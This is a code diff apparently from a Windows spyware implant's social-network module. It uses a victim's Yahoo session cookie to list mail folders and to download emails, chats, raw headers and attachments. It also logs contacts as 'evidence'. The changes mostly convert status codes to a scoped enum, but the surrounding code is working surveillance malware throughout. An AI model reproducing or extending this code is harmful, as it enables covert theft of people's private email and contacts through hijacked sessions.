@@ -1,9 +1,11 @@
+#define _CRT_SECURE_NO_WARNINGS 1
+
 #include <windows.h>
 #include <stdio.h>
 #include <time.h>
-#include "..\common.h"
-#include "../bss.h"
-#include "..\LOG.h"
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/bss.h"
+#include "../../H4DLL/LOG.h"
 #include "SocialMain.h"
 #include "NetworkHandler.h"
 #include "Handler_Yahoo.h"
@@ -76,7 +78,7 @@ LPSTR EncodeURL(LPSTR strString)
 }
 
 //cerca un identifier all'interno di un buffer e ne restituisce il valore
-BOOL YHSearchIdentifier(LPWSTR *strId, LPSTR strBuffer, LPSTR strIdTag, char cEndOfId, int nMaxLen)
+BOOL YHSearchIdentifier(LPWSTR *strId, LPSTR strBuffer, LPCSTR strIdTag, char cEndOfId, int nMaxLen)
 {
 	LPSTR lpTmp = NULL;
 	int i;
@@ -391,7 +393,7 @@ DWORD YHLogContacts(LPSTR strContacts, LPYAHOO_CONNECTION_PARAMS pYHParams)
 								zndelete((LPVOID*)&jValue);
 								Log_CloseFile(hfile);
 
-								return YAHOO_ALLOC_ERROR;
+								return (DWORD) YahooStatus::YAHOO_ALLOC_ERROR;
 							}
 						} // contact's field loop
 
@@ -419,7 +421,7 @@ DWORD YHLogContacts(LPSTR strContacts, LPYAHOO_CONNECTION_PARAMS pYHParams)
 	zndelete((LPVOID*)&jValue);
 	Log_CloseFile(hfile);
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 
@@ -432,7 +434,7 @@ DWORD YHParseContacts(LPSTR strCookie, LPYAHOO_CONNECTION_PARAMS pYHParams)
 
 	strURI = (LPWSTR) zalloc(YAHOO_ALLOC_SIZE * sizeof(WCHAR));
 	if(strURI == NULL)
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 
 	CheckProcessStatus();
 	_snwprintf_s(strURI, YAHOO_ALLOC_SIZE, _TRUNCATE,  L"/neo/ws/sd?/v1/user/%s/contacts;format=json&view=compact", pYHParams->strNeoGUID);
@@ -446,11 +448,11 @@ DWORD YHParseContacts(LPSTR strCookie, LPYAHOO_CONNECTION_PARAMS pYHParams)
 	}
 
 	//get last timestamp
-	if(YHGetLastTimeStamp(pYHParams, "_c") == YAHOO_SUCCESS)
+	if(YHGetLastTimeStamp(pYHParams, "_c") == (DWORD)YahooStatus::YAHOO_SUCCESS)
 	{		
 		//log contacts
 		dwRet = YHLogContacts(strRecvBuffer, pYHParams);
-		if(dwRet == YAHOO_SUCCESS)
+		if(dwRet == (DWORD)YahooStatus::YAHOO_SUCCESS)
 			dwRet = SOCIAL_REQUEST_SUCCESS;
 		else
 			dwRet = SOCIAL_REQUEST_BAD_COOKIE;	
@@ -484,7 +486,7 @@ DWORD YahooContactHandler(LPSTR strCookie)
 
 	//get conctacts list and log evidences
 	dwRet = YHParseContacts(strCookie, &YHParams);
-	if(dwRet != YAHOO_SUCCESS)
+	if(dwRet != (DWORD) YahooStatus::YAHOO_SUCCESS)
 	{
 		dwRet = SOCIAL_REQUEST_BAD_COOKIE;
 	}
@@ -535,7 +537,7 @@ DWORD YHParseMailBox(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_P
 	struct tm tstamp;
 
 	//get the last timestamp for emails
-	if(YHGetLastTimeStamp(pYHParams, strMailBoxName) != YAHOO_SUCCESS)
+	if(YHGetLastTimeStamp(pYHParams, strMailBoxName) != (DWORD) YahooStatus::YAHOO_SUCCESS)
 		return SOCIAL_REQUEST_BAD_COOKIE;
 
 	//get mails list for the selected folder
@@ -566,7 +568,7 @@ DWORD YHParseMailBox(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_P
 	if(pYHParams->strMailFolder == NULL)
 	{
 		zndelete((LPVOID*)&jValue);
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	}
 
 	swprintf_s(pYHParams->strMailFolder, dwLen, L"%S", strMailBoxName);
@@ -594,21 +596,21 @@ DWORD YHParseMailBox(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_P
 		{
 			znfree((LPVOID*)&pYHParams->strMailFolder);
 			zndelete((LPVOID*)&jValue);
-			return YAHOO_ALLOC_ERROR;
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 		}
 		_snprintf_s(strMailID, dwLen, _TRUNCATE, "%S", jObj[strMID]->AsString().c_str());
 
 		//get date from the list because it may be different from chat body date
 		//causing duplicated logs. The mail to be logged are already filtered, by date,
 		//in the YHGetMailsList function
-		dwTimeStamp = jObj[strDateFld]->AsNumber();
+		dwTimeStamp = (DWORD) jObj[strDateFld]->AsNumber();
 
 		//chat or email selection
 		if(!_stricmp(strMailBoxName, "%40C%40Chats"))
 		{
 			//get the conversation
 			dwRet = YHGetChat(&ChatFields, strMailID, pYHParams, strCookie);
-			if(dwRet == YAHOO_SUCCESS)
+			if(dwRet == (DWORD)YahooStatus::YAHOO_SUCCESS)
 			{
 				_gmtime32_s(&tstamp, (__time32_t *)&pYHParams->dwLastMailDate);
 				tstamp.tm_year += 1900;
@@ -626,7 +628,7 @@ DWORD YHParseMailBox(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_P
 		{
 			//get the email
 			dwRet = YHGetMail(&strMail, strMailID, pYHParams, strCookie);
-			if(dwRet == YAHOO_SUCCESS)
+			if(dwRet == (DWORD)YahooStatus::YAHOO_SUCCESS)
 			{
 				dwLen = strlen(strMail);
 				if(dwLen > shared.max_social_mail_len)
@@ -671,7 +673,7 @@ DWORD YHParseMailBox(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_P
 //get mails list for the selected mailbox name (sort order: desc)
 DWORD YHGetMailsList(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_PARAMS pYHParams, JSONValue** jValue, JSONArray* pjMail, LPDWORD pdwNrOfMails)
 {	
-	LPSTR	strJSONParams	= "{\"method\":\"ListMessages\",\"params\": [{\"fid\":\"%s\",\"numInfo\": %d,\"numMid\": %d,\"sortKey\": \"date\",\"sortOrder\":\"down\",\"groupBy\":\"unRead\"}]}";
+	LPSTR	strJSONParams	= (LPSTR)"{\"method\":\"ListMessages\",\"params\": [{\"fid\":\"%s\",\"numInfo\": %d,\"numMid\": %d,\"sortKey\": \"date\",\"sortOrder\":\"down\",\"groupBy\":\"unRead\"}]}";
 	LPWSTR	strURI			= NULL;
 	LPWSTR	strReqID		= NULL;
 	LPSTR	strPostBuffer   = NULL;
@@ -697,7 +699,7 @@ DWORD YHGetMailsList(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_P
 	if(strURI == NULL)
 	{
 		znfree((LPVOID*)&strReqID);
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	}
 	_snwprintf_s(strURI, YAHOO_ALLOC_SIZE, _TRUNCATE, L"/ws/mail/v2.0/jsonrpc?appid=YahooMailNeo&m=ListFolderThreads&wssid=%s&ymreqid=%s", pYHParams->strWSSID, strReqID);
 	znfree((LPVOID*)&strReqID);
@@ -707,7 +709,7 @@ DWORD YHGetMailsList(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_P
 	if(strPostBuffer == NULL)
 	{		
 		znfree((LPVOID*)&strURI);
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	}
 	//post params
 	_snprintf_s(strPostBuffer, YAHOO_ALLOC_SIZE, _TRUNCATE, strJSONParams, strMailBoxName, dwNrOfMails, 0);
@@ -792,7 +794,7 @@ DWORD YHGetMailsList(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_P
 //get mails list for the selected mailbox name (sort order: desc)
 DWORD YHGetFoldersName(JSONValue** jValue, LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strCookie)
 {	
-	LPSTR	strJSONParams	= "{\"method\":\"ListFolders\",\"params\": [{}]}";
+	LPSTR	strJSONParams	= (LPSTR)"{\"method\":\"ListFolders\",\"params\": [{}]}";
 	LPWSTR	strURI			= NULL;
 	LPWSTR	strReqID		= NULL;
 	LPSTR	strPostBuffer   = NULL;	
@@ -813,7 +815,7 @@ DWORD YHGetFoldersName(JSONValue** jValue, LPYAHOO_CONNECTION_PARAMS pYHParams, 
 	if(strURI == NULL)
 	{
 		znfree((LPVOID*)&strReqID);
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	}
 
 	//get folders name request
@@ -825,7 +827,7 @@ DWORD YHGetFoldersName(JSONValue** jValue, LPYAHOO_CONNECTION_PARAMS pYHParams, 
 	if(strPostBuffer == NULL)
 	{
 		znfree((LPVOID*)&strURI);
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	}
 	strcpy_s(strPostBuffer, YAHOO_ALLOC_SIZE, strJSONParams);
 
@@ -870,7 +872,7 @@ DWORD YHGetMail(LPSTR* strMail, LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHPa
 
 	//request mail with mail ID
 	dwRet = YHGetMailBody(strMailID, pYHParams, strCookie, &strMailBody);
-	if(dwRet != YAHOO_SUCCESS)
+	if(dwRet != (DWORD) YahooStatus::YAHOO_SUCCESS)
 	{
 		znfree((LPVOID*)&strMailBody);
 		return dwRet;
@@ -878,7 +880,7 @@ DWORD YHGetMail(LPSTR* strMail, LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHPa
 
 	//get mail row header
 	dwRet = YHGetMailHeader(strMailID, pYHParams, strCookie, &strMailHeader);
-	if(dwRet != YAHOO_SUCCESS)
+	if(dwRet != (DWORD) YahooStatus::YAHOO_SUCCESS)
 	{
 		znfree((LPVOID*)&strMailHeader);
 		znfree((LPVOID*)&strMailBody);
@@ -887,7 +889,7 @@ DWORD YHGetMail(LPSTR* strMail, LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHPa
 
 	//assemble email
 	dwRet = YHAssembleMail(strMailHeader, strMailBody, strMail);
-	if(dwRet != YAHOO_SUCCESS)
+	if(dwRet != (DWORD) YahooStatus::YAHOO_SUCCESS)
 	{
 		znfree((LPVOID*)&strMailHeader);
 		znfree((LPVOID*)&strMailBody);
@@ -898,14 +900,14 @@ DWORD YHGetMail(LPSTR* strMail, LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHPa
 	znfree((LPVOID*)&strMailHeader);
 	znfree((LPVOID*)&strMailBody);
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 
 //request the header of a mail
 DWORD YHGetMailHeader(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strCookie, LPSTR* strMailHeader)
 {
-	LPSTR	strGetHeader	= "{\"method\": \"GetMessageRawHeader\",\"params\": [{\"fid\": \"%S\",\"mid\": [\"%s\"]}]}";
+	LPSTR	strGetHeader	= (LPSTR)"{\"method\": \"GetMessageRawHeader\",\"params\": [{\"fid\": \"%S\",\"mid\": [\"%s\"]}]}";
 	LPSTR   strBuffer		= NULL;
 	LPSTR   strRecvBuffer	= NULL;
 	LPWSTR  strTmp			= NULL;
@@ -935,7 +937,7 @@ DWORD YHGetMailHeader(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPST
 	if(strURI == NULL)
 	{
 		znfree((LPVOID*)&strReqID);
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	}
 
 	_snwprintf_s(strURI, YAHOO_ALLOC_SIZE, _TRUNCATE, L"/ws/mail/v2.0/jsonrpc?appid=YahooMailNeo&m=ListFolderThreads&wssid=%s&ymreqid=%s", pYHParams->strWSSID, strReqID);	
@@ -946,7 +948,7 @@ DWORD YHGetMailHeader(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPST
 	if(strBuffer == NULL)
 	{		
 		znfree((LPVOID*)&strURI);
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	}
 	_snprintf_s(strBuffer, dwSize, _TRUNCATE, strGetHeader, pYHParams->strMailFolder, strMailID);
 
@@ -1000,7 +1002,7 @@ DWORD YHGetMailHeader(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPST
 					{	
 						znfree((LPVOID*)&pOldBuf);
 						zndelete((LPVOID*)&jValue);
-						return YAHOO_ALLOC_ERROR;
+						return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 					}						
 
 					//copy value to buffer
@@ -1019,7 +1021,7 @@ DWORD YHGetMailHeader(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPST
 				{
 					znfree((LPVOID*)&strTmp);
 					zndelete((LPVOID*)&jValue);
-					return YAHOO_ALLOC_ERROR;
+					return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 				}
 				wcstombs_s((size_t*)&dwSize, *strMailHeader, dwTotSize+1, strTmp, _TRUNCATE);				
 				
@@ -1036,7 +1038,7 @@ DWORD YHGetMailHeader(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPST
 
 	zndelete((LPVOID*)&jValue);
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 
@@ -1057,20 +1059,20 @@ DWORD YHAddAttachment(LPWSTR* strMail, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPY
 
 		//download attachment
 		dwRet = YHGetMailAttachment(strMailID, lpYHParams, lpMailFields, strCookie, &MailAttachment);
-		switch(dwRet)
+		switch((YahooStatus)dwRet)
 		{
-			case YAHOO_SUCCESS:
+			case YahooStatus::YAHOO_SUCCESS:
 				//insert the attachment into the mail body
-				if(ReallocAndAppendString(strMail, MailAttachment.strEncodedAttachment) != YAHOO_SUCCESS)
+				if(ReallocAndAppendString(strMail, MailAttachment.strEncodedAttachment) != (DWORD) YahooStatus::YAHOO_SUCCESS)
 				{
 					znfree((LPVOID*)strMail);
 					znfree((LPVOID*)&MailAttachment.strEncodedAttachment);					
-					return YAHOO_ALLOC_ERROR;
+					return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 				}
 				break;
 
-			case YAHOO_ERROR:
-			case YAHOO_ALLOC_ERROR:				
+			case YahooStatus::YAHOO_ERROR:
+			case YahooStatus::YAHOO_ALLOC_ERROR:
 				znfree((LPVOID*)&MailAttachment.strEncodedAttachment);
 				znfree((LPVOID*)strMail);
 				return dwRet;
@@ -1080,13 +1082,13 @@ DWORD YHAddAttachment(LPWSTR* strMail, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPY
 		znfree((LPVOID*)&MailAttachment.strEncodedAttachment);
 	}
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 //request the mail associated to an email ID
 DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR strCookie, LPSTR* strMailBody)
 {
-	LPSTR	strGetMsg = "{\"method\": \"GetMessage\",\"params\": [{\"fid\": \"%S\",\"message\": [{\"blockImages\": \"none\",\"mid\": \"%s\",\"expandCIDReferences\": true, \"enableWarnings\": true,\"restrictCSS\": true}]}]}";
+	LPSTR	strGetMsg = (LPSTR)"{\"method\": \"GetMessage\",\"params\": [{\"fid\": \"%S\",\"message\": [{\"blockImages\": \"none\",\"mid\": \"%s\",\"expandCIDReferences\": true, \"enableWarnings\": true,\"restrictCSS\": true}]}]}";
 	LPSTR   strBuffer		= NULL;
 	LPSTR   strRecvBuffer	= NULL;	
 	LPWSTR	strReqID		= NULL;
@@ -1100,7 +1102,6 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 	YAHOO_MAIL_FIELDS		MailNextFields;
 
 	//json vars
-	std::vector<int>::size_type i;
 	std::vector<int>::size_type j;
 	JSONValue* jValue = NULL;
 	JSONArray  jMsg, jArray;
@@ -1123,7 +1124,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 	if(strURI == NULL)
 	{
 		znfree((LPVOID*)&strReqID);
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	}
 	_snwprintf_s(strURI, YAHOO_ALLOC_SIZE, _TRUNCATE, L"/ws/mail/v2.0/jsonrpc?appid=YahooMailNeo&m=ListFolderThreads&wssid=%s&ymreqid=%s", lpYHParams->strWSSID, strReqID); // FIXME ARRAY	
 	znfree((LPVOID*)&strReqID);
@@ -1133,7 +1134,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 	if(strBuffer == NULL)
 	{		
 		znfree((LPVOID*)&strURI);
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	}
 
 	//post buffer
@@ -1176,7 +1177,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 				if(!jMsg[0]->IsObject())
 				{
 					zndelete((LPVOID*)&jValue);
-					return YAHOO_ERROR;
+					return (DWORD)YahooStatus::YAHOO_ERROR;
 				}
 
 				//json object containing the message
@@ -1193,7 +1194,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 				if(!jObj[strPartFld]->IsArray())
 				{
 					zndelete((LPVOID*)&jValue);
-					return YAHOO_ERROR;
+					return (DWORD)YahooStatus::YAHOO_ERROR;
 				}
 
 				jArray = jObj[strPartFld]->AsArray();
@@ -1215,9 +1216,9 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 					dwRet = YHExtractMailFields(jObj, &MailFields, &MailBoundaries);
 					switch(dwRet)
 					{
-						case YAHOO_SKIP:
+						case (DWORD)YahooStatus::YAHOO_SKIP:
 							continue;
-						case YAHOO_SUCCESS:
+						case(DWORD)YahooStatus::YAHOO_SUCCESS:
 							break;
 						default:
 							//free memory and exit
@@ -1229,7 +1230,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 					if ((j+1) < (jArray.size()))					
 					{
 						dwRet = YHExtractMailFields(jArray[j+1]->AsObject(), &MailNextFields, NULL);
-						if(dwRet == YAHOO_ALLOC_ERROR)
+						if(dwRet == (DWORD)YahooStatus::YAHOO_ALLOC_ERROR)
 						{
 							//free memory and exit
 							dwError = dwRet;
@@ -1263,7 +1264,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 					//add the section header to the mail
 					if(bWriteSection)
 					{
-						if(YHAddSectionHeader(&strTmp, &MailFields) != YAHOO_SUCCESS)
+						if(YHAddSectionHeader(&strTmp, &MailFields) != (DWORD) YahooStatus::YAHOO_SUCCESS)
 						{
 							//free memory and exit
 							dwError = dwRet;
@@ -1272,7 +1273,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 					}
 
 					//add the section text to the mail
-					if(YHAddSectionText(&strTmp, &MailFields) != YAHOO_SUCCESS)
+					if(YHAddSectionText(&strTmp, &MailFields) != (DWORD) YahooStatus::YAHOO_SUCCESS)
 					{
 						//free memory and exit
 						dwError = dwRet;
@@ -1280,7 +1281,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 					}
 
 					//if present, download the attachment and add it to the mail
-					if(YHAddAttachment(&strTmp, lpYHParams, &MailFields, strMailID, strCookie) != YAHOO_SUCCESS)
+					if(YHAddAttachment(&strTmp, lpYHParams, &MailFields, strMailID, strCookie) != (DWORD) YahooStatus::YAHOO_SUCCESS)
 					{
 						//free memory and exit
 						dwError = dwRet;
@@ -1303,7 +1304,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 						}
 						
 						//add the boundary
-						if(YHAddMailBoundary(&strTmp, &MailBoundaries, bCloseSection) == YAHOO_ALLOC_ERROR)
+						if(YHAddMailBoundary(&strTmp, &MailBoundaries, bCloseSection) == (DWORD)YahooStatus::YAHOO_ALLOC_ERROR)
 						{
 							dwError = dwRet;
 							continue;
@@ -1313,7 +1314,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 						if((bCloseSection) && (MailBoundaries.dwTotItems > 0))
 						{
 							//add the boundary
-							if(YHAddMailBoundary(&strTmp, &MailBoundaries, FALSE) == YAHOO_ALLOC_ERROR)
+							if(YHAddMailBoundary(&strTmp, &MailBoundaries, FALSE) == (DWORD)YahooStatus::YAHOO_ALLOC_ERROR)
 							{
 								dwError = dwRet;
 								continue;
@@ -1323,7 +1324,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 					else
 					{
 						//this is the last section of the mail, so write a closing section boundary
-						if(YHAddMailBoundary(&strTmp, &MailBoundaries, TRUE) == YAHOO_ALLOC_ERROR)
+						if(YHAddMailBoundary(&strTmp, &MailBoundaries, TRUE) == (DWORD)YahooStatus::YAHOO_ALLOC_ERROR)
 						{
 							//free memory and exit
 							dwError = dwRet;
@@ -1355,7 +1356,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 				if(strTmp == NULL)
 				{
 					zndelete((LPVOID*)&jValue);
-					return YAHOO_SKIP;
+					return (DWORD)YahooStatus::YAHOO_SKIP;
 				}
 
 				dwTotSize = wcslen(strTmp);
@@ -1366,7 +1367,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 				{
 					znfree((LPVOID*)&strTmp);
 					zndelete((LPVOID*)&jValue);
-					return YAHOO_ALLOC_ERROR;
+					return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 				}
 
 				//converto from wide char to multi byte
@@ -1397,7 +1398,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 	{
 		//delete json value
 		zndelete((LPVOID*)&jValue);
-		return YAHOO_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ERROR;
 	}
 
 	//delete json value
@@ -1405,9 +1406,9 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 
 	//if the mail is old, skip it
 	if(dwMailDate == 0)
-		return YAHOO_SKIP;
+		return (DWORD)YahooStatus::YAHOO_SKIP;
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 
@@ -1434,10 +1435,10 @@ DWORD YHGetChatInfo(__out LPYAHOO_CHAT_FIELDS lpChatFields, __in JSONObject pjHe
 	SecureZeroMemory(&strSeparator, sizeof(strSeparator));
 
 	//get the user field
-	if(ReallocAndAppendString(&lpChatFields->strMailUser, (LPWSTR)pjHeader[strUserFld]->AsString().c_str()) != YAHOO_SUCCESS)
+	if(ReallocAndAppendString(&lpChatFields->strMailUser, (LPWSTR)pjHeader[strUserFld]->AsString().c_str()) != (DWORD) YahooStatus::YAHOO_SUCCESS)
 	{
 		znfree((LPVOID*)&lpChatFields->strMailUser);
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	}
 
 	//get 'from' obj
@@ -1446,31 +1447,31 @@ DWORD YHGetChatInfo(__out LPYAHOO_CHAT_FIELDS lpChatFields, __in JSONObject pjHe
 		jObj = pjHeader[strFromFld]->AsObject();
 
 		//author
-		if(ReallocAndAppendString(&lpChatFields->strAuthor, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != YAHOO_SUCCESS)
+		if(ReallocAndAppendString(&lpChatFields->strAuthor, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != (DWORD) YahooStatus::YAHOO_SUCCESS)
 		{
 			znfree((LPVOID*)&lpChatFields->strAuthor);
-			return YAHOO_ALLOC_ERROR;
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 		}
 
 		//author id
-		if(ReallocAndAppendString(&lpChatFields->strAuthorID, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != YAHOO_SUCCESS)
+		if(ReallocAndAppendString(&lpChatFields->strAuthorID, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != (DWORD) YahooStatus::YAHOO_SUCCESS)
 		{
 			znfree((LPVOID*)&lpChatFields->strAuthorID);
-			return YAHOO_ALLOC_ERROR;
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 		}
 
 /*
 		//get email (peer id)
-		if(ReallocAndAppendString(&lpChatFields->strPeersID, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != YAHOO_SUCCESS)
-			return YAHOO_ALLOC_ERROR;
+		if(ReallocAndAppendString(&lpChatFields->strPeersID, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != (DWORD) YahooStatus::YAHOO_SUCCESS)
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 
 		//get name (peer name)
-		//if(ReallocAndAppendString(&lpChatFields->strPeers, (LPWSTR)jObj[strNameFld]->AsString().c_str()) != YAHOO_SUCCESS)		
-		//	return YAHOO_ALLOC_ERROR;
+		//if(ReallocAndAppendString(&lpChatFields->strPeers, (LPWSTR)jObj[strNameFld]->AsString().c_str()) != (DWORD) YahooStatus::YAHOO_SUCCESS)		
+		//	return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 
 		//get the email as name because sometimes the name is not present
-		if(ReallocAndAppendString(&lpChatFields->strPeers, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != YAHOO_SUCCESS)
-			return YAHOO_ALLOC_ERROR;
+		if(ReallocAndAppendString(&lpChatFields->strPeers, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != (DWORD) YahooStatus::YAHOO_SUCCESS)
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 */
 	}
 
@@ -1496,18 +1497,18 @@ DWORD YHGetChatInfo(__out LPYAHOO_CHAT_FIELDS lpChatFields, __in JSONObject pjHe
 				else
 					strSeparator[0] = 0;
 
-				if(ReallocAndAppendString(&lpChatFields->strPeersID, strSeparator, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != YAHOO_SUCCESS)
+				if(ReallocAndAppendString(&lpChatFields->strPeersID, strSeparator, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != (DWORD) YahooStatus::YAHOO_SUCCESS)
 				{
 					znfree((LPVOID*)&lpChatFields->strPeersID);
-					return YAHOO_ALLOC_ERROR;
+					return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 				}
 			}
 
 			//get name (peer name)
 			//if((jObj[strNameFld]->AsString().c_str() != NULL) && (jObj[strNameFld]->AsString().c_str() != L""))
 			//{
-			//	if(ReallocAndAppendString(&lpChatFields->strPeers,  L", ",  (LPWSTR)jObj[strNameFld]->AsString().c_str()) != YAHOO_SUCCESS)
-			//		return YAHOO_ALLOC_ERROR;
+			//	if(ReallocAndAppendString(&lpChatFields->strPeers,  L", ",  (LPWSTR)jObj[strNameFld]->AsString().c_str()) != (DWORD) YahooStatus::YAHOO_SUCCESS)
+			//		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 			//}
 
 			//get the email as name because sometimes the name is not present
@@ -1517,10 +1518,10 @@ DWORD YHGetChatInfo(__out LPYAHOO_CHAT_FIELDS lpChatFields, __in JSONObject pjHe
 					wcscpy_s(strSeparator, 4, L", ");
 				else
 					strSeparator[0] = 0;
-				if(ReallocAndAppendString(&lpChatFields->strPeers, strSeparator, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != YAHOO_SUCCESS)
+				if(ReallocAndAppendString(&lpChatFields->strPeers, strSeparator, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != (DWORD) YahooStatus::YAHOO_SUCCESS)
 				{
 					znfree((LPVOID*)&lpChatFields->strPeers);
-					return YAHOO_ALLOC_ERROR;
+					return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 				}
 			}
 			strSeparator[0] = 0;
@@ -1549,10 +1550,10 @@ DWORD YHGetChatInfo(__out LPYAHOO_CHAT_FIELDS lpChatFields, __in JSONObject pjHe
 				else
 					strSeparator[0] = 0;
 
-				if(ReallocAndAppendString(&lpChatFields->strPeersID, strSeparator, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != YAHOO_SUCCESS)
+				if(ReallocAndAppendString(&lpChatFields->strPeersID, strSeparator, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != (DWORD) YahooStatus::YAHOO_SUCCESS)
 				{
 					znfree((LPVOID*)&lpChatFields->strPeersID);
-					return YAHOO_ALLOC_ERROR;
+					return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 				}
 			}
 
@@ -1560,8 +1561,8 @@ DWORD YHGetChatInfo(__out LPYAHOO_CHAT_FIELDS lpChatFields, __in JSONObject pjHe
 			//get name (peer name)
 			if(jObj[strNameFld]->AsString().c_str() != NULL)
 			{
